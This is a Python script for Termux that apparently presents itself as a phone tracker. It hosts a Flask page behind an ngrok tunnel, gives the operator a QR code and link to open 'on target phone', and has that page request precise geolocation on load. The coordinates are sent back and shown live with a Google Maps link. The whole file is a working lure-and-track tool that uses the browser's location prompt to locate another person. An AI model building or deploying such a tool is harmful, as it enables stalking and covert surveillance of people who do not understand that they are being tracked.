# HCO Track Phone by Azhar - Internet Version
# Requirements: Termux, Python3, Flask, Ngrok, qrcode, requests

import os
import subprocess
import threading
import time
import socket
import sys
import requests
from flask import Flask, request, render_template_string, jsonify

# Color codes with bold
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
MAGENTA = "\033[1;95m"
BLUE = "\033[1;94m"
WHITE = "\033[1;97m"
RESET = "\033[0m"
CLEAR = "\033[2J\033[H"

locations = {}
app = Flask(__name__)
TRACKING_URL = ""
ngrok_process = None

# ---------------- Install required packages -----------------
def install_requirements():
    print(f"{YELLOW}Checking requirements...{RESET}")
    
    # Check and install Python packages
    try:
        import flask
        import qrcode
        import requests
    except ImportError:
        print(f"{YELLOW}Installing required Python packages...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", "flask", "qrcode[pil]", "requests", "pyngrok"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Check if ngrok is installed
    try:
        subprocess.run(["ngrok", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except:
        print(f"{YELLOW}Installing ngrok...{RESET}")
        try:
            # Try to install ngrok using official method
            os.system("pkg install curl -y")
            os.system("curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | tee /data/data/com.termux/files/usr/etc/apt/trusted.gpg.d/ngrok.asc >/dev/null")
            os.system('echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | tee /data/data/com.termux/files/usr/etc/apt/sources.list.d/ngrok.list')
            os.system("pkg update && pkg install ngrok -y")
        except:
            print(f"{RED}Failed to install ngrok automatically.{RESET}")
            print(f"{YELLOW}Please install ngrok manually: https://ngrok.com/download{RESET}")
            return False
    return True

# ---------------- Start Ngrok Tunnel -----------------
def start_ngrok(port):
    global TRACKING_URL
    try:
        # Try using pyngrok first
        from pyngrok import ngrok
        
        # Create tunnel
        public_url = ngrok.connect(port, bind_tls=True).public_url
        TRACKING_URL = public_url
        print(f"{GREEN}Ngrok tunnel created: {TRACKING_URL}{RESET}")
        return True
    except Exception as e:
        print(f"{YELLOW}Pyngrok failed, trying direct ngrok command...{RESET}")
        
        # Alternative method using subprocess
        try:
            ngrok_process = subprocess.Popen(
                ["ngrok", "http", str(port), "--log=stdout"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            time.sleep(5)  # Wait for ngrok to start
            
            # Try to get the public URL from ngrok API
            try:
                response = requests.get("http://localhost:4040/api/tunnels", timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    public_url = data["tunnels"][0]["public_url"]
                    TRACKING_URL = public_url
                    print(f"{GREEN}Ngrok tunnel created: {TRACKING_URL}{RESET}")
                    return True
            except:
                print(f"{YELLOW}Could not get ngrok URL from API. Using alternative method...{RESET}")
                
                # Manual fallback - create a simple HTTP server for testing
                LOCAL_IP = socket.gethostbyname(socket.gethostname())
                TRACKING_URL = f"http://{LOCAL_IP}:{port}"
                print(f"{YELLOW}Using local network URL: {TRACKING_URL}{RESET}")
                print(f"{YELLOW}Make sure both devices are on same WiFi network{RESET}")
                return True
        except Exception as e:
            print(f"{RED}Failed to start ngrok: {e}{RESET}")
            return False

# ---------------- Find available port -----------------
def find_available_port():
    for port in range(5000, 5020):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(('0.0.0.0', port))
                return port
            except:
                continue
    return 5000  # Fallback

SERVER_PORT = find_available_port()

# ---------------- Flask routes -----------------
dashboard_template = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>HCO Track Phone by Azhar</title>
<script>
function sendLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position){
            fetch('/update', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy
                })
            }).then(response => {
                if(response.ok) {
                    document.getElementById('status').innerHTML = 'Location sent successfully!';
                    document.getElementById('status').style.color = 'green';
                }
            });
        }, function(error){
            document.getElementById('status').innerHTML = 'Location access denied or unavailable.';
            document.getElementById('status').style.color = 'red';
        }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
    } else {
        document.getElementById('status').innerHTML = 'Geolocation not supported by your browser';
        document.getElementById('status').style.color = 'red';
    }
}
window.onload = function() {
    document.getElementById('status').innerHTML = 'Requesting location access...';
    sendLocation();
};
</script>
<style>
body { 
    background: #000; 
    color: #0f0; 
    text-align: center; 
    font-family: Arial, sans-serif; 
    padding: 20px;
}
h1 { 
    font-size: 28px; 
    margin-top: 30px;
    color: #ff0000;
    text-shadow: 0 0 10px #ff0000;
}
p { 
    font-size: 18px; 
    color: #0f0; 
    margin: 15px 0;
}
.container {
    max-width: 500px;
    margin: 0 auto;
    border: 2px solid #0f0;
    border-radius: 10px;
    padding: 20px;
    background: #111;
}
.logo {
    font-size: 24px;
    font-weight: bold;
    margin-bottom: 20px;
    color: #ff0000;
}
button {
    background: #0f0;
    color: #000;
    border: none;
    padding: 10px 20px;
    border-radius: 5px;
    font-weight: bold;
    cursor: pointer;
    margin: 10px;
}
</style>
</head>
<body>
<div class="container">
    <div class="logo">HCO TRACK PHONE BY AZHAR</div>
    <p>Click the button below to share your location</p>
    <button onclick="sendLocation()">SHARE LOCATION</button>
    <p id="status">Waiting for permission...</p>
    <p>You can close this page after sharing location</p>
</div>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(dashboard_template)

@app.route('/location')
def get_location():
    return jsonify(locations)

@app.route('/update', methods=['POST'])
def update_location():
    data = request.json
    if data and 'lat' in data and 'lon' in data:
        locations['lat'] = data['lat']
        locations['lon'] = data['lon']
        locations['accuracy'] = data.get('accuracy', 'N/A')
        locations['last_update'] = time.time()
        print(f"{GREEN}Location received: {data['lat']}, {data['lon']}{RESET}")
        return "OK"
    return "Invalid Data"

def start_server():
    import logging
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    app.run(host='0.0.0.0', port=SERVER_PORT, debug=False, use_reloader=False)

# ---------------- Tool lock + countdown + YouTube -----------------
def tool_lock_youtube():
    os.system(CLEAR)
    print(f"{RED}{'='*80}{RESET}")
    print(f"{RED}{'🔒 TOOL LOCKED 🔒'.center(80)}{RESET}")
    print(f"{RED}{'Subscribe & click the BELL icon on YouTube 🔔'.center(80)}{RESET}")
    print(f"{RED}{'='*80}{RESET}\n")
    print(f"{CYAN}{'Redirecting in:'.center(80)}{RESET}\n")
    
    # Simple countdown without clearing lines
    for i in range(5, 0, -1):
        print(f"{CYAN}{str(i).center(80)}{RESET}")
        time.sleep(1)
    
    youtube_url = "https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", youtube_url], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{GREEN}Opening YouTube...{RESET}")
    except:
        print(f"{YELLOW}Open YouTube manually: {youtube_url}{RESET}")
    
    input(f"\n{YELLOW}Press ENTER after returning from YouTube...{RESET}")

# ---------------- Generate QR Code -----------------
def generate_qr_code():
    try:
        import qrcode
        
        # Generate QR code
        qr = qrcode.QRCode(version=1, box_size=2, border=2)
        qr.add_data(TRACKING_URL)
        qr.make(fit=True)
        
        # Create QR code image
        img = qr.make_image(fill_color="red", back_color="black")
        img_path = "/data/data/com.termux/files/home/tracking_qr.png"
        img.save(img_path)
        
        # Display QR code in Termux
        try:
            subprocess.run(["termux-open", img_path], 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"{GREEN}QR code generated and opened!{RESET}")
        except:
            print(f"{YELLOW}QR code saved to: {img_path}{RESET}")
            
    except Exception as e:
        print(f"{RED}Failed to generate QR code: {e}{RESET}")

# ---------------- Display banner -----------------
def display_banner():
    os.system(CLEAR)
    print(f"{RED}{'='*80}{RESET}")
    print(f"{RED}{'HCO TRACK PHONE BY AZHAR'.center(80)}{RESET}")
    print(f"{RED}{'='*80}{RESET}\n")
    print(f"{GREEN}{'Scan the QR code or open this URL on target phone:'.center(80)}{RESET}\n")
    print(f"{CYAN}{TRACKING_URL.center(80)}{RESET}\n")
    print(f"{YELLOW}{'WORKS ON ANY NETWORK - INTERNET REQUIRED'.center(80)}{RESET}")
    print(f"{MAGENTA}{'Press Ctrl+C to exit'.center(80)}{RESET}\n")

# ---------------- Check if server is running -----------------
def check_server_running():
    try:
        response = requests.get(f"http://localhost:{SERVER_PORT}", timeout=3)
        return response.status_code == 200
    except:
        return False

# ---------------- Main -----------------
if __name__ == "__main__":
    try:
        # First show tool lock and YouTube redirect
        tool_lock_youtube()
        
        # Install requirements
        if not install_requirements():
            print(f"{RED}Failed to install requirements. Exiting.{RESET}")
            sys.exit(1)
        
        # Clear screen after YouTube redirect
        os.system(CLEAR)
        print(f"{GREEN}Starting HCO Track Phone tool...{RESET}")
        print(f"{YELLOW}Using port: {SERVER_PORT}{RESET}")
        
        # Start Flask server
        print(f"{YELLOW}Starting server...{RESET}")
        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()
        
        # Wait for server to start
        server_start_time = time.time()
        server_ready = False
        while time.time() - server_start_time < 30:
            if check_server_running():
                server_ready = True
                break
            time.sleep(1)
        
        if not server_ready:
            print(f"{RED}Server failed to start. Trying different port...{RESET}")
            # Try to force kill anything on the port
            try:
                subprocess.run(["fuser", "-k", f"{SERVER_PORT}/tcp"], 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
            time.sleep(2)
            server_thread = threading.Thread(target=start_server, daemon=True)
            server_thread.start()
            time.sleep(5)
        
        print(f"{GREEN}Server started successfully on port {SERVER_PORT}!{RESET}")
        
        # Start ngrok tunnel
        print(f"{YELLOW}Creating internet tunnel...{RESET}")
        if start_ngrok(SERVER_PORT):
            print(f"{GREEN}Internet access enabled!{RESET}")
        else:
            print(f"{RED}Failed to create internet tunnel. Using local network only.{RESET}")
            LOCAL_IP = socket.gethostbyname(socket.gethostname())
            TRACKING_URL = f"http://{LOCAL_IP}:{SERVER_PORT}"
            print(f"{YELLOW}Local URL: {TRACKING_URL}{RESET}")
            print(f"{YELLOW}Note: Both devices must be on same WiFi network{RESET}")
        
        # Generate QR code
        print(f"{YELLOW}Generating QR code...{RESET}")
        generate_qr_code()
        time.sleep(2)
        
        # Display banner with the link
        display_banner()
        
        # Live location printing in Termux
        last_location_time = 0
        connection_wait_time = time.time()
        display_refresh_time = time.time()
        
        while True:
            # Refresh display every 15 seconds to prevent clutter
            current_time = time.time()
            if current_time - display_refresh_time > 15:
                os.system(CLEAR)
                display_banner()
                display_refresh_time = current_time
                
            if locations and 'last_update' in locations:
                current_time = time.time()
                # Only update if we have a new location
                if locations['last_update'] > last_location_time:
                    last_location_time = locations['last_update']
                    time_str = time.strftime('%H:%M:%S', time.localtime(locations['last_update']))
                    print(f"{GREEN}📍 LIVE LOCATION {time_str}{RESET}")
                    print(f"{GREEN}Latitude: {locations.get('lat')}{RESET}")
                    print(f"{GREEN}Longitude: {locations.get('lon')}{RESET}")
                    print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m{RESET}")
                    
                    # Show Google Maps link
                    lat = locations.get('lat')
                    lon = locations.get('lon')
                    if lat and lon:
                        maps_url = f"https://maps.google.com/?q={lat},{lon}"
                        print(f"{GREEN}Google Maps: {maps_url}{RESET}")
                    
                    print(f"{BLUE}{'-'*40}{RESET}")
            else:
                # Show waiting message with elapsed time
                elapsed = int(current_time - connection_wait_time)
                print(f"{YELLOW}Waiting for target phone to connect ({elapsed}s)...{RESET}")
                print(f"{YELLOW}Scan the QR code or open: {CYAN}{TRACKING_URL}{RESET}")
                print(f"{YELLOW}On target phone, click 'SHARE LOCATION' button{RESET}")
                print(f"{BLUE}{'-'*40}{RESET}")
            
            time.sleep(3)
            
    except KeyboardInterrupt:
        print(f"\n{RED}Shutting down...{RESET}")
        print(f"{GREEN}Thank you for using HCO Track Phone!{RESET}")
        
        # Kill ngrok process if running
        if ngrok_process:
            ngrok_process.terminate()
            
    except Exception as e:
        print(f"{RED}Error: {e}{RESET}")
        print(f"{YELLOW}Please make sure you have installed all requirements:{RESET}")
        print(f"{CYAN}pkg install python curl -y{RESET}")
        print(f"{CYAN}pip install flask requests qrcode[pil] pyngrok{RESET}")
